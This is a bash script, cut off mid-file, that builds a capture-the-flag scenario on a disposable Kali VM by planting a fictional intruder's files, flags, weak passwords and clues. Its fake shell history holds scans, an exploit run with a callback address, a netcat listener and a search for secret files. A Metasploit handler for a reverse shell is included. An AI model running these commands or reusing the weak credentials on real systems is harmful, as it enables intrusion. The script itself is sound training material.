#!/bin/bash

# !!! HIGH RISK WARNING !!!
# This script modifies the host Kali system extensively by running the
# 'populate_ghost_vm_enhanced.sh' script logic directly.
# ONLY RUN THIS ON A DEDICATED, DISPOSABLE KALI INSTALLATION (VM).
# Do NOT run on a primary machine or one with important data/configs.
# You MUST run this script with sudo.

# Rigorous exit on error
set -e

# --- Configuration Variables (Consistent with populate script & compose) ---
PROJECT_DIR="/opt/ghostframe_ctf" # Install location for docker files
GHOST_USER="ghost" # The user created by the populate script
GHOST_USER_HOME="/home/${GHOST_USER}"

# Passwords & Secrets
SSH_KEY_PASS="GhostInTheShell2077"
ZIP_PASS="ProjectChimera!"
KEEPASS_PASS="ChangeMe123!"
STEGO_PASS="steganography"
DELTA_CHARLIE_KEY="DeltaCharlie"
MYSQL_ROOT_PASS="StrongRootPassword!"
DB_WEB_USER="web_user"
DB_WEB_PASS="SimplePassw0rd"
GHOST_SAMBA_PASS="password123"
SVC_DEPLOY_SSH_KEY_PASSPHRASE="" # Empty passphrase for svc_deploy key

# Network Details
VPN_SERVER_FQDN="vpn.ghostframe.local" # Using .local for local resolution (needs host/DNS setup or manual /etc/hosts)
VPN_SUBNET="192.168.255.0/24" # Subnet for VPN clients
DMZ_SUBNET="172.16.10.0/24"
INTERNAL1_SUBNET="10.0.10.0/24"
INTERNAL2_HSZ_SUBNET="10.0.50.0/24"
CONTROL_NET_SUBNET="192.168.200.0/24" # Define subnet for control network
DIRECTOR_IP="192.168.200.2" # Static IP for Director on control_net
DIRECTOR_PORT="9999"
SSH_JUMP_DMZ_IP="172.16.10.5"
WEB_DMZ_IP="172.16.10.100"
PORTAL_DMZ_IP="172.16.10.105"
DB_INT1_IP="10.0.10.200"
FILESREV_INT1_IP="10.0.10.50"
DEVWIKI_INT1_IP="10.0.10.150"
TESTSERV_INT1_IP="10.0.10.250"
QEC_SIM_HSZ_IP="10.0.50.50"

# Email Addresses/Domains (Used in populate script text generation)
TARGET_DOMAIN_EXTERNAL="targetcorp.com"
ADMIN_EMAIL="admin@${TARGET_DOMAIN_EXTERNAL}"
CANARY_EMAIL="anonymous_canary@protonmail.com"

# --- Flags (Centralized for consistency) ---
FLAG_ZFINSTRUCT="FLAG{ZEROFRAME_INSTRUCTIONS_RECEIVED}"
FLAG_MAINSTRAT="FLAG{MAIN_STRATEGY_DOCUMENT_LOCATED}"
FLAG_HIDDENSPACE="FLAG{FOUND_HIDDEN_SPACED_FILE}"
FLAG_KEEPASS="FLAG{ACCESSED_KEEPASS_PLACEHOLDER}"
# Define STEGO_VAL inside populate function where RANDOM works reliably
# FLAG_STEGO="FLAG{STEGO_SKY_IS_BLUE_${RANDOM}}"
FLAG_BASE64="FLAG{BASE64_HIDDEN_IN_CONFIG}"
FLAG_CANARY="FLAG{CANARY_CONTACT_DETAILS_RECEIVED}"
FLAG_JUMPBOX="FLAG{JUMPBOX_ACCESS_GHOST}"
FLAG_WEBCREDS="FLAG{WEBSERVER_DB_CREDS_LEAKED}"
FLAG_PORTALSQLI="FLAG{PORTAL_ACCESS_VIA_SQLI}"
FLAG_PORTALHTML="FLAG{PORTAL_HTML_SOURCE_VIEW}" # Minor flag in portal source
FLAG_DBCONNECT="FLAG{DB_ACCESS_PROJECT_GRIFFIN_MENTIONED}"
FLAG_FILESERVCREDS="FLAG{FILESERV_ACCESS_DEVWIKI_CREDS}"
FLAG_WIKIACCESS="FLAG{WIKI_ACCESS_GRIFFIN_DETAILS}"
FLAG_SVCKEY="FLAG{SVC_DEPLOY_SSH_KEY_FOUND}"
FLAG_QECROOT="FLAG{QEC_ROOT_ACCESS_GHOST_WARNING}"
FLAG_PAYLOADFOUND="FLAG{FINAL_PAYLOAD_PACKAGE_FOUND}"
FLAG_FINAL="FLAG{PROJECT_GRIFFIN_UNCOVERED_AI_DANGER}"


# --- Embedded Populate Script ---
# Save the populate script content to a temporary file
POPULATE_SCRIPT_CONTENT=$(cat << 'EOF_POPULATE'
#!/bin/bash

# === Configuration ===
# Inherited from master script environment variables where possible,
# or redefined here if needed specifically inside this script's text generation logic.
TARGET_USER="${GHOST_USER}" # Use env var if set, else default
TARGET_HOME="/home/${TARGET_USER:-ghost}" # Use env var if set
# Define file paths/URLs using master script vars for consistency in text files
TARGET_IP_INTERNAL="${SSH_JUMP_DMZ_IP:-172.16.10.5}"
TARGET_WEB_PORTAL="portal.${TARGET_DOMAIN_EXTERNAL:-targetcorp.com}"
TARGET_DOMAIN_EXTERNAL="${TARGET_DOMAIN_EXTERNAL:-targetcorp.com}"
VPN_SERVER_IP="vpn.nulldivision.internal" # Use FQDNs in text files
DIRECTOR_IP="director.nulldivision.internal"
DIRECTOR_PORT="${DIRECTOR_PORT:-9999}"
GHOST_WEAK_PASS="${GHOST_SAMBA_PASS:-password123}" # Use samba pass for user
SSH_KEY_PASS="${SSH_KEY_PASS:-GhostInTheShell2077}"
ZIP_PASS="${ZIP_PASS:-ProjectChimera!}"
KEEPASS_PASS="${KEEPASS_PASS:-ChangeMe123!}"
ADMIN_EMAIL="${ADMIN_EMAIL:-admin@targetcorp.com}"
CANARY_EMAIL="${CANARY_EMAIL:-anonymous_canary@protonmail.com}"
FILESREV_IP="${FILESREV_INT1_IP:-10.0.10.50}" # Need IP for text generation
DEVWIKI_IP="${DEVWIKI_INT1_IP:-10.0.10.150}"
QECSIM_IP="${QEC_SIM_HSZ_IP:-10.0.50.50}"
STEGO_PASS_VAR="${STEGO_PASS:-steganography}" # Get stego pass

# Inherit flags from environment for embedding in files
FLAG_MAINSTRAT_VAR="${FLAG_MAINSTRAT:-FLAG{MAIN_STRATEGY_DOCUMENT_LOCATED}}"
FLAG_ZFINSTRUCT_VAR="${FLAG_ZFINSTRUCT:-FLAG{ZEROFRAME_INSTRUCTIONS_RECEIVED}}"
FLAG_HIDDENSPACE_VAR="${FLAG_HIDDENSPACE:-FLAG{FOUND_HIDDEN_SPACED_FILE}}"
FLAG_KEEPASS_VAR="${FLAG_KEEPASS:-FLAG{ACCESSED_KEEPASS_PLACEHOLDER}}"
FLAG_BASE64_VAR="${FLAG_BASE64:-FLAG{BASE64_HIDDEN_IN_CONFIG}}"
FLAG_CANARY_VAR="${FLAG_CANARY:-FLAG{CANARY_CONTACT_DETAILS_RECEIVED}}"

# === Helper Function for Ownership ===
set_owner() {
  chown -R "${TARGET_USER}:${TARGET_USER}" "$1" &>/dev/null
}

# === Helper Function for Timestamp Variation ===
touch_random_time() {
    local filename="$1"
    local random_secs=$(( RANDOM % 3600 * 24 * 30 )) # Random time within last ~30 days
    touch -d "@$(($(date +%s) - random_secs))" "$filename" &>/dev/null || echo "[WARN] touch_random_time failed for $filename"
}

# === Initial Checks and Setup ===
echo "[*] Starting Host 'Ghostification' Script Execution..."
if [[ $EUID -ne 0 ]]; then echo "[!] This part must run as root"; exit 1; fi
if ! id "$TARGET_USER" &>/dev/null; then
    echo "[*] User $TARGET_USER not found. Creating..."
    useradd -m -s /bin/bash "$TARGET_USER"
    echo "${TARGET_USER}:${GHOST_WEAK_PASS}" | chpasswd
    usermod -aG sudo "$TARGET_USER" # Add ghost user to sudo group on Kali
    echo "[*] User $TARGET_USER created with password '${GHOST_WEAK_PASS}'."
else
    echo "[*] User $TARGET_USER exists."
    # Ensure password matches if user already exists? Uncomment if needed.
    # echo "${TARGET_USER}:${GHOST_WEAK_PASS}" | chpasswd
fi
# Ensure home directory exists and has basic perms (master script handles ownership later if needed)
mkdir -p "$TARGET_HOME"
chmod 755 "$TARGET_HOME" # Start with standard perms
# Set owner right away to avoid permission issues during script execution
set_owner "$TARGET_HOME"

echo "[*] Ensuring necessary tools are installed..."
# Check / install packages using master check_dep logic if possible, or install here
apt-get update > /dev/null
# Ensure non-interactive frontend for installs
export DEBIAN_FRONTEND=noninteractive
apt-get install -y --no-install-recommends \
    zip steghide git openssl coreutils vim tree keepassxc libnotify-bin \
    apache2-utils curl wget jq python3-pip filezilla proxychains \
    imagemagick libimage-exiftool-perl fallocate openvpn \
    net-tools dnsutils netcat build-essential > /dev/null || echo "[WARN] Some packages might already be installed."

echo "[*] Creating extensive directory structure in ${TARGET_HOME}..."
mkdir -p \
    "${TARGET_HOME}/Documents/research/project_chimera"/{payloads,recon_data,notes} \
    "${TARGET_HOME}/Downloads/torrents" \
    "${TARGET_HOME}/Notes/personal" \
    "${TARGET_HOME}/scripts"/{recon,exploit} \
    "${TARGET_HOME}/dev/project_chimera/src" \
    "${TARGET_HOME}/.config"/{terminator,sublime-text,some_app} \
    "${TARGET_HOME}/.local/share/Trash"/{files,info} \
    "${TARGET_HOME}/.irssi/logs" \
    "${TARGET_HOME}/vpn_configs" \
    "${TARGET_HOME}/Pictures" \
    "${TARGET_HOME}/Mail"/{inbox,sent} \
    "${TARGET_HOME}/.mozilla/firefox/profile.default/storage/default" \
    "${TARGET_HOME}/.ssh/keys_archive" \
    "${TARGET_HOME}/.cache/pip" \
    "${TARGET_HOME}/tools"/{web,net,misc} \
    "${TARGET_HOME}/.proxychains"
set_owner "${TARGET_HOME}" # Set ownership for newly created dirs

echo "[*] Populating shell history for ${TARGET_USER}..."
# Use real target IPs for commands run inside this script
REAL_SSH_JUMP_IP="${TARGET_IP_INTERNAL}"
REAL_DIRECTOR_IP="${DIRECTOR_IP:-192.168.200.2}" # Default if master var not set
cat << EOF >> "${TARGET_HOME}/.bash_history"
tree ~/Documents/research/
nmap -sV -sC -oX ~/Documents/research/project_chimera/recon_data/targetcorp_scan.xml $TARGET_DOMAIN_EXTERNAL
gobuster dir -u https://$TARGET_WEB_PORTAL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o ~/Documents/research/project_chimera/recon_data/gobuster_results.txt
ssh ghost@${REAL_SSH_JUMP_IP} -i ~/.ssh/id_ed25519
git clone https://github.com/ethicalhack3r/wordpress-exploitation.git ~/dev/wp-exploit-test
cd ~/dev/wp-exploit-test
# Example specific command
python3 exploit.py --target $TARGET_WEB_PORTAL --lhost 192.168.255.10 --lport 4444 # Simulates Ghost trying from VPN IP
sudo mount /dev/sdb1 /mnt/secretz # Fails, expected
nc -lvnp 4444
vim ~/Documents/research/project_chimera/notes/main_strategy.md
ping $TARGET_DOMAIN_EXTERNAL
whois $TARGET_DOMAIN_EXTERNAL
locate id_rsa # Ghost looking for keys
cp ~/.ssh/id_rsa_ghost_encrypted ~/.ssh/keys_archive/backup_vpn_key_$(date +%Y%m%d).key
zip -e -P '${ZIP_PASS}' ~/Downloads/chimera_backup.zip ~/Documents/research/project_chimera/
# rm ~/Downloads/chimera_backup.zip # Left it this time
sudo updatedb
find / -name "*secret*" -type f 2>/dev/null
proxychains firefox https://$TARGET_WEB_PORTAL &
curl -x socks5h://localhost:9050 https://check.torproject.org/api/ip # Checking tor?
cat ~/Mail/inbox/msg_from_ZF_01.eml
keepassxc & # Run GUI
htpasswd -nb admin TempPass123 # Test generating hash
nc ${REAL_DIRECTOR_IP} ${DIRECTOR_PORT} # Test connection to director
smbclient //${FILESREV_IP}/Public -U guest # Try connecting to fileserv
mysql -h ${DB_INT1_IP:-10.0.10.200} -u ${DB_WEB_USER:-web_user} -p # Try connecting to DB
EOF
set_owner "${TARGET_HOME}/.bash_history"

echo "[*] Placing more detailed notes and documents in ${TARGET_HOME}..."
# Main Research Notes
cat << EOF > "${TARGET_HOME}/Documents/research/project_chimera/notes/main_strategy.md"
# Project Chimera - Strategy

**Objective:** Infiltrate TargetCorp, locate proprietary algorithm source code (Project "Griffin"?). Exfil via designated secure channel.

**Attack Vectors:**
1.  **Web Portal (${TARGET_WEB_PORTAL}):** Custom built. Check gobuster results. Potential for SQLi, maybe LFI/RFI? WAF is active, need bypass.
2.  **SSH (${REAL_SSH_JUMP_IP}):** Found this jump box. Using 'ghost' account. Try key \`~/.ssh/id_ed25519\` first. Weak password maybe? ${GHOST_WEAK_PASS}?
3.  **Phishing:** Maybe target ${ADMIN_EMAIL}? High risk. Avoid for now.

**Credentials & Hints:**
- **KeePass DB:** \`~/Documents/ghost_secrets.kdbx\` (Password: '${KEEPASS_PASS}'). Mostly junk/test data? Check anyway. ${FLAG_KEEPASS_VAR}
- **VPN Key Pwd:** \`~/.ssh/id_rsa_ghost_encrypted\` - Reminder: "That Keanu Reeves cyberpunk movie... the year it released?" -> **${SSH_KEY_PASS}**
- **Research Zip Pwd:** \`~/Downloads/chimera_backup.zip\` - Reminder: "Project name screamed out loud!" -> **${ZIP_PASS}**
- **Stego Pwd:** For \`~/Pictures/sky.png\` -> **${STEGO_PASS_VAR}**

**Internal Targets (Guesses/Info):**
- Fileserv: ${FILESREV_IP} (SMB) - Check shares: Public, HR_Shared, ghost_data
- Database: ${DB_INT1_IP:-10.0.10.200} (MySQL) - Need creds (web_user?)
- Dev Wiki: ${DEVWIKI_IP} (HTTP/S) - Project Griffin details likely here. Need creds.
- QEC Sim: ${QECSIM_IP} (SSH?) - High security zone. Project Griffin core? Requires special access?

**Concerns:**
- ZF mentioned increased chatter. Potential mole ("Canary" mentioned in leak?). Trust no one.
- Need secure exfil plan. Tor? Pre-arranged dead drop?
- Must find Canary's data drop info. Check emails (URGENT subject?). Protocol "DeltaCharlie"?

${FLAG_MAINSTRAT_VAR}
EOF
touch_random_time "${TARGET_HOME}/Documents/research/project_chimera/notes/main_strategy.md"

# Personal Notes
cat << EOF > "${TARGET_HOME}/Notes/personal/reminders.txt"
- Pay rent (late!)
- Change KeePass password!!! ('${KEEPASS_PASS}' is temp)
- Backup work files to external (still need to buy drive)
- Re-check Canary comms signal - use burner email ${CANARY_EMAIL}. Deadline looms.
- Stego password for sky.png is '${STEGO_PASS_VAR}' - simple, noted here for now.
- TODO: Analyze Nul1Div leak file from Trash? Mentioned mole?
EOF
touch_random_time "${TARGET_HOME}/Notes/personal/reminders.txt"

# Trash File Scenario
echo "[*]   Setting up Trash file clue..."
TRASH_DIR_FILES="${TARGET_HOME}/.local/share/Trash/files"
TRASH_DIR_INFO="${TARGET_HOME}/.local/share/Trash/info"
mkdir -p "${TRASH_DIR_FILES}" "${TRASH_DIR_INFO}"
cat << EOF > "${TRASH_DIR_FILES}/Nul1Div_comms_leak_analysis.txt"
#### Analysis of Supposed Nu11Div Internal Comms Leak ####

Source: Unknown dump on fringe forum. Authenticity questionable.

Content Summary:
- Increased paranoia from Zer0Frame (ZF) mentioned multiple times. Worried about opsec breaches.
- Disagreements noted between ZF and member 'Cygnus' regarding target selection/risk.
- **Mention of an internal code name "Canary"**. Context implies potential informant or double agent providing info *to* ZF, or possibly leaking *from* N1D. Very ambiguous. Could this be our contact for Chimera? Or someone working against us? Critical to determine.
- No direct mention of Project Chimera or TargetCorp found in this fragment.
- Vague reference to a failed operation "Aquila" - lesson learned?

Conclusion: Leak seems minor, possibly fabricated, but the "Canary" reference is concerning/intriguing given the Chimera context. Could be coincidence, could be linked. Must be cautious.

**ACTION: Delete this analysis if compromised.** (Which Ghost apparently did)
EOF
# Create corresponding info file
# Calculate original path URI encoded
ORIG_PATH=$(echo -n "${TARGET_HOME}/Documents/research/Nul1Div_comms_leak_analysis.txt" | perl -MURI::Escape -ne 'print uri_escape($_)')
# Generate deletion date roughly 1 week ago
DEL_DATE=$(date -R -d "-7 days")
cat << EOF > "${TRASH_DIR_INFO}/Nul1Div_comms_leak_analysis.txt.trashinfo"
[Trash Info]
Path=${ORIG_PATH}
DeletionDate=${DEL_DATE}
EOF
set_owner "${TARGET_HOME}/.local" # Ensure ghost owns .local and subdirs

# "Hidden" Note with space in filename
HIDDEN_NOTE_FILE="${TARGET_HOME}/Notes/. hidden config " # Note the trailing space
cat << EOF > "${HIDDEN_NOTE_FILE}"
Trying to hide some API keys here - probably expired:
AWS_KEY: AKIAIOSFODNN7EXAMPLE
AWS_SECRET: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Might use this later for cloud exfil if desperate. Need valid creds.
${FLAG_HIDDENSPACE_VAR}
EOF
touch_random_time "${HIDDEN_NOTE_FILE}"

# Placeholders using fallocate
echo "[*] Creating large placeholder files..."
fallocate -l 2G "${TARGET_HOME}/Downloads/torrents/kali-linux-2024.1-installer-amd64.iso" &>/dev/null || echo "[WARN] fallocate failed for kali iso"
fallocate -l 5G "${TARGET_HOME}/Documents/research/project_chimera/canary_encrypted_data.img" &>/dev/null || echo "[WARN] fallocate failed for canary image"
touch_random_time "${TARGET_HOME}/Downloads/torrents/kali-linux-2024.1-installer-amd64.iso"
touch_random_time "${TARGET_HOME}/Documents/research/project_chimera/canary_encrypted_data.img"

# KeePass Database Placeholder Text
echo "[*] Creating KeePass placeholder file..."
# Actual DB should be created manually by player using KeePassXC
cat << EOF > "${TARGET_HOME}/Documents/ghost_secrets.kdbx.txt"
This is a placeholder text file.
You should ideally create a real KeePass database named 'ghost_secrets.kdbx' in this location using KeePassXC.

Password: ${KEEPASS_PASS}

Example Entries to Add (Manually):
- Title: TargetCorp Portal (Test), User: test, Pass: test, URL: https://${TARGET_WEB_PORTAL}
- Title: Old Personal Git, User: ghost, Pass: P@ssw0rd! (Compromised)
- Title: Local SSH Key (id_ed25519), Notes: No password set. Used for ${REAL_SSH_JUMP_IP}.
- Title: Fileserv Access, User: ghost, Pass: ${GHOST_WEAK_PASS}, Notes: Try this on ${FILESREV_IP}

Flag inside placeholder/DB: ${FLAG_KEEPASS_VAR}
EOF
touch_random_time "${TARGET_HOME}/Documents/ghost_secrets.kdbx.txt"

set_owner "${TARGET_HOME}/Documents"
set_owner "${TARGET_HOME}/Notes"
set_owner "${HIDDEN_NOTE_FILE}"
set_owner "${TARGET_HOME}/Downloads"

echo "[*] Setting up connectivity clues in ${TARGET_HOME}..."
# VPN Config Placeholder (Master script provides real .ovpn)
mkdir -p ${TARGET_HOME}/vpn_configs
cat << EOF > ${TARGET_HOME}/vpn_configs/Nu11Division_Ops.ovpn.txt
NOTE: Use the 'player-ghostframe.ovpn' file placed in \`${TARGET_HOME}\` by the setup script to connect.
This config requires the key at \`~/.ssh/id_rsa_ghost_encrypted\`. Password hint in main strategy notes.
EOF
# Create dummy cert files referenced by the placeholder OVPN config text below (for internal consistency only)
openssl req -nodes -new -x509 -keyout ${TARGET_HOME}/vpn_configs/ca.key -out ${TARGET_HOME}/vpn_configs/ca.crt -subj "/C=XX/ST=NU/L=NULL/O=Nu11Division/OU=Ops/CN=Nu11DivisionCA" &>/dev/null
openssl req -nodes -new -x509 -keyout ${TARGET_HOME}/vpn_configs/ghost.key -out ${TARGET_HOME}/vpn_configs/ghost.crt -subj "/C=XX/ST=NU/L=NULL/O=Nu11Division/OU=Users/CN=0xGhostVPN" &>/dev/null
rm -f ${TARGET_HOME}/vpn_configs/ca.key ${TARGET_HOME}/vpn_configs/ghost.key # Remove private parts
set_owner ${TARGET_HOME}/vpn_configs

# --- SSH Config --- (Ensure correct permissions)
mkdir -p ${TARGET_HOME}/.ssh/keys_archive
chmod 700 ${TARGET_HOME}/.ssh
# Generate SSH Keys INSIDE /home/ghost (if master script didn't already place them)
if [[ ! -f "${TARGET_HOME}/.ssh/id_ed25519" ]]; then
    echo "[*]   Generating SSH key id_ed25519..."
    ssh-keygen -t ed25519 -f "${TARGET_HOME}/.ssh/id_ed25519" -N "" -C "${TARGET_USER}@ghost-dev-$(date +%s)"
fi
if [[ ! -f "${TARGET_HOME}/.ssh/id_rsa_ghost_encrypted" ]]; then
     echo "[*]   Generating SSH key id_rsa_ghost_encrypted..."
    ssh-keygen -t rsa -b 4096 -f "${TARGET_HOME}/.ssh/id_rsa_ghost_encrypted" -N "$SSH_KEY_PASS" -C "${TARGET_USER}@vpn-access-$(date +%s)"
fi
chmod 600 "${TARGET_HOME}/.ssh/id_"*
chmod 644 "${TARGET_HOME}/.ssh/id_"*.pub
set_owner "${TARGET_HOME}/.ssh"

# SSH Config file
cat << EOF > "${TARGET_HOME}/.ssh/config"
Host target_internal jumpbox
    HostName ${REAL_SSH_JUMP_IP}
    User ghost
    IdentityFile ~/.ssh/id_ed25519
    Port 22
    ConnectTimeout 5

Host target_portal # Example for portal if SSH is suspected
    HostName ${TARGET_WEB_PORTAL}
    User www-data # Guessing common web user
    Port 22

Host director # Alias for flag submission server
    HostName ${REAL_DIRECTOR_IP}
    Port ${DIRECTOR_PORT} # Note: this is for nc, not ssh port
    ConnectTimeout 3

# Internal hosts likely resolved via VPN/hosts file
Host fileserv
    HostName ${FILESREV_IP}
    User ghost

Host devwiki
    HostName ${DEVWIKI_IP}

Host qecsim
    HostName ${QECSIM_IP}
    User svc_deploy
    # IdentityFile ~/.ssh/id_rsa_svc_deploy # Would need key copied here

Host *
    # StrictHostKeyChecking ask # Default
    # UserKnownHostsFile ~/.ssh/known_hosts # Default
    ConnectTimeout 5
EOF

# Known Hosts (add dummy entry for jumpbox)
KNOWN_HOSTS_FILE="${TARGET_HOME}/.ssh/known_hosts"
if [[ ! -f "$KNOWN_HOSTS_FILE" ]]; then touch "$KNOWN_HOSTS_FILE"; fi
# Add entry if not present
if ! grep -q "${REAL_SSH_JUMP_IP}" "$KNOWN_HOSTS_FILE"; then
    ssh-keyscan -H -t ed25519 "${REAL_SSH_JUMP_IP}" >> "$KNOWN_HOSTS_FILE" 2>/dev/null || echo "[WARN] ssh-keyscan failed for ${REAL_SSH_JUMP_IP}"
fi
touch_random_time "${TARGET_HOME}/.ssh/config"
touch_random_time "$KNOWN_HOSTS_FILE"
set_owner "${TARGET_HOME}/.ssh"

# Proxychains Config
mkdir -p ${TARGET_HOME}/.proxychains
cat << EOF > ${TARGET_HOME}/.proxychains/proxychains.conf
# proxychains.conf VER 4.x Defaults + Tor
strict_chain
proxy_dns
remote_dns_subnet 224.0.0.0/4
tcp_read_time_out 15000
tcp_connect_time_out 8000
localnet 127.0.0.0/255.0.0.0
localnet ::1/128
quiet_mode

[ProxyList]
# Tor running locally on default port
socks5  127.0.0.1 9050
EOF
cp ${TARGET_HOME}/.proxychains/proxychains.conf /etc/proxychains.conf # System-wide too (requires root)
set_owner ${TARGET_HOME}/.proxychains

echo "[*] Placing Flag Submission Instructions in ${TARGET_HOME}..."
# Uses REAL_DIRECTOR_IP for clarity that it's an IP address to connect to
cat << EOF > "${TARGET_HOME}/Notes/README_ZF_CONTACT.txt"
Ghost,

Use the Ops VPN config \`~/player-ghostframe.ovpn\` (provided by setup). Connect this machine.
Key: \`~/.ssh/id_rsa_ghost_encrypted\` (Password hint in main strategy notes).

Report flags IMMEDIATELY.
Target: **nc ${REAL_DIRECTOR_IP} ${DIRECTOR_PORT}** (or use ssh alias: \`nc director ${DIRECTOR_PORT}\`)
Format: **FLAG{flag_value_here}**

First validation flag (also in strategy notes): ${FLAG_MAINSTRAT_VAR}
The REAL first flag from me (send this first!): ${FLAG_ZFINSTRUCT_VAR}

Check Mail for Canary details ('URGENT' email). Use burner. Protocol DeltaCharlie.

-ZF
EOF
set_owner "${TARGET_HOME}/Notes/README_ZF_CONTACT.txt"

echo "[*] Creating simulated emails in ${TARGET_HOME}..."
MAIL_DIR=${TARGET_HOME}/Mail/inbox
SENT_DIR=${TARGET_HOME}/Mail/sent
mkdir -p $MAIL_DIR $SENT_DIR

# Email from ZF
cat << EOF > ${MAIL_DIR}/msg_from_ZF_01.eml
From: Zer0Frame <zf@nulldivision.internal>
To: 0xGhost <ghost@nulldivision.internal>
Subject: URGENT - Canary Contact
Date: $(date -R -d "-2 days")

Ghost,

Canary is ready. Sensitive. Use Protonmail for contact: **${CANARY_EMAIL}**
Reference "Project Chimera - Phase 4 Delivery".
They have the encrypted package location. Expecting key exchange protocol **DeltaCharlie**.
Do NOT use Nul1Div comms for this. Burner email only. Get confirmation.

Find what we need. Get out clean. Time is critical.

-ZF
${FLAG_CANARY_VAR}
EOF
touch_random_time ${MAIL_DIR}/msg_from_ZF_01.eml

# Email from "TargetCorp HR" (Phishing test? Spam?)
cat << EOF > ${MAIL_DIR}/msg_hr_phish_test.eml
From: TargetCorp HR <hr@${TARGET_DOMAIN_EXTERNAL}>
To: ghost_applicant@email.com # Old email maybe?
Subject: Your Application Status Update - Action Required
Date: $(date -R -d "-10 days")

Dear Applicant,

Thank you for your interest in TargetCorp. To proceed with your application, please login to our secure portal to update your profile and view current opportunities:

https://${TARGET_WEB_PORTAL}/applicant_login

Use the credentials provided during your initial application. If you have forgotten your password, please use the reset link on the portal.

We look forward to hearing from you!

Sincerely,
TargetCorp Human Resources Team
EOF
touch_random_time ${MAIL_DIR}/msg_hr_phish_test.eml

# Sent email TO ZF (shows Ghost's paranoia)
cat << EOF > ${SENT_DIR}/msg_to_ZF_concerns.eml
From: 0xGhost <ghost@nulldivision.internal>
To: Zer0Frame <zf@nulldivision.internal>
Subject: Re: Status Update - Concerns & Progress
Date: $(date -R -d "-3 days")

ZF,

Acknowledged previous messages. Making progress on TargetCorp but hitting WAF issues on portal (${TARGET_WEB_PORTAL}). Also, jump box (${REAL_SSH_JUMP_IP}) access confirmed using key \`id_ed25519\`.

Still feeling watched. Seeing odd traffic spikes on VPN, correlate with my activity? Could be coincidence, could be heat. Recommend limited comms unless critical like Canary update. Will use proxychains/Tor for external recon now.

Internal mapping proceeding from jump box. Fileserv (${FILESREV_IP}) and DB (${DB_INT1_IP:-10.0.10.200}) identified. Working on access.

Will proceed carefully. Backup plan involves TOR exfil if needed.

-Ghost
EOF
touch_random_time ${SENT_DIR}/msg_to_ZF_concerns.eml

set_owner ${TARGET_HOME}/Mail

# === Deeper Forensics / Hidden Clues ===

echo "[*] Creating encrypted archive in ${TARGET_HOME}..."
mkdir -p /tmp/chimera_sensitive_host_$$ # Use PID for uniqueness
echo "TargetCorp Internal Structure Notes:" > /tmp/chimera_sensitive_host_$$/internal_notes.txt
echo "- Fileserver @ ${FILESREV_IP} likely contains //SHARE/Financials, //SHARE/Dev_Builds, maybe //SHARE/ghost_data?" >> /tmp/chimera_sensitive_host_$$/internal_notes.txt
echo "- Database @ ${DB_INT1_IP:-10.0.10.200} might hold user creds or project details." >> /tmp/chimera_sensitive_host_$$/internal_notes.txt
echo "Insider contact 'Canary' provided hint for encrypted drive image location (check email). Need decryption key - protocol **DeltaCharlie**?" > /tmp/chimera_sensitive_host_$$/contact_info.txt
set_owner ${TARGET_HOME} # Set owner on tmp dir before zip? Maybe not needed.
# Create the zip file (password defined in config)
zip -r -j -e -P "${ZIP_PASS}" "${TARGET_HOME}/Downloads/chimera_backup.zip" /tmp/chimera_sensitive_host_$$ > /dev/null
rm -rf /tmp/chimera_sensitive_host_$$
set_owner "${TARGET_HOME}/Downloads/chimera_backup.zip"
touch_random_time "${TARGET_HOME}/Downloads/chimera_backup.zip"

echo "[*] Hiding data with steganography in ${TARGET_HOME}..."
mkdir -p ${TARGET_HOME}/Pictures
FLAG_STEGO_VAL="FLAG{STEGO_SKY_IS_BLUE_$(od -A n -t d -N 1 /dev/urandom | tr -d '[:space:]')}" # Generate random part here
convert -size 100x60 xc:skyblue /tmp/sky_host_$$.png
echo ${FLAG_STEGO_VAL} > /tmp/secret_host_$$.txt
rm -f "${TARGET_HOME}/Pictures/sky.png" # Remove previous if exists
# Use -sf to specify output filename directly
if steghide embed -cf /tmp/sky_host_$$.png -ef /tmp/secret_host_$$.txt -sf "${TARGET_HOME}/Pictures/sky.png" -p "${STEGO_PASS_VAR}" -q; then
    echo "[+] Stego image created: ${TARGET_HOME}/Pictures/sky.png"
else
    echo "[WARN] Steghide failed. Is it installed and working? Embedding skipped."
    cp /tmp/sky_host_$$.png "${TARGET_HOME}/Pictures/sky.png" # Copy base image anyway
fi
rm -f /tmp/sky_host_$$.png /tmp/secret_host_$$.txt
set_owner "${TARGET_HOME}/Pictures/sky.png"
touch_random_time "${TARGET_HOME}/Pictures/sky.png"

# Add another hidden clue - Base64 encoded string in a config file
echo "[*] Hiding Base64 data in dummy config in ${TARGET_HOME}..."
mkdir -p "${TARGET_HOME}/.config/some_app"
cat << EOF > "${TARGET_HOME}/.config/some_app/config.ini"
[Settings]
user_setting = true
# Debug flag, do not enable in prod
debug_level = 0
# Old API key backup (likely invalid):
# api_key_backup = $(echo ${FLAG_BASE64_VAR} | base64)
EOF
set_owner "${TARGET_HOME}/.config/some_app"
touch_random_time "${TARGET_HOME}/.config/some_app/config.ini"

echo "[*] Placing miscellaneous files & tool configs in ${TARGET_HOME}..."
# Dummy scripts
mkdir -p ${TARGET_HOME}/scripts/{recon,exploit}
cat << EOF > ${TARGET_HOME}/scripts/recon/quick_scan.sh
#!/bin/bash
if [ -z "\$1" ]; then echo "Usage: \$0 <target_ip_or_domain>"; exit 1; fi
TARGET="\$1"
OUT_FILE="scan_\${TARGET}_\$(date +%Y%m%d_%H%M).txt"
echo "[*] Running quick Nmap on \${TARGET}, output to \${OUT_FILE}"
nmap -T4 -F --open \$TARGET -oN "\${OUT_FILE}"
echo "[*] Running basic dirb on http://\${TARGET}"
dirb http://\${TARGET} /usr/share/wordlists/dirb/common.txt -o quick_dirb_\${TARGET}.txt & # Run in background
echo "[+] Scan script finished."
EOF
chmod +x ${TARGET_HOME}/scripts/recon/quick_scan.sh

# Example Metasploit resource script
mkdir -p ${TARGET_HOME}/.msf4/logs
cat << EOF > ${TARGET_HOME}/.msf4/targetcorp_handler.rc
# MSF Resource Script for Generic Handler
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp # Assume Linux target first
# set PAYLOAD windows/meterpreter/reverse_tcp # Alt for Windows
# Get LHOST from active tun0 interface if VPN is up
LHOST_IP=\$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
if [ -z "\$LHOST_IP" ]; then
  echo "[-] VPN (tun0) not detected. Set LHOST manually."
  set LHOST 0.0.0.0 # Default fallback
else
  set LHOST \$LHOST_IP
fi
set LPORT 4444
exploit -j -z
